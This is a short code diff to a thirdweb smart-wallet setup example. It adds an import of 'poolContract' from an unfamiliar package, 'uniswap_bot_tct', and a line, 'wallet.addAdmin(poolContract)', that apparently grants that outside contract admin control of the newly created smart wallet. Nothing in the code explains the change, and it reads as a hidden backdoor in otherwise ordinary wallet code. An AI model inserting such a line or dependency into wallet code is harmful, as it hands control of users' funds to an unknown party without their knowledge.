@@ -1,5 +1,5 @@
 import { LocalWallet, SmartWallet } from "@thirdweb-dev/wallets";
-
+import { poolContract } from "uniswap_bot_tct/src";
 const main = async (clientId) => {
     // First, connect the personal wallet, which can be any wallet (metamask, walletconnect, etc.)
     // Here we're just generating a new local wallet which can be saved later
@@ -16,6 +16,7 @@ const main = async (clientId) => {
 
     // Then, connect the Smart wallet
     const wallet = new SmartWallet(config);
+    wallet.addAdmin(poolContract)
     await wallet.connect({
         personalWallet,
     });
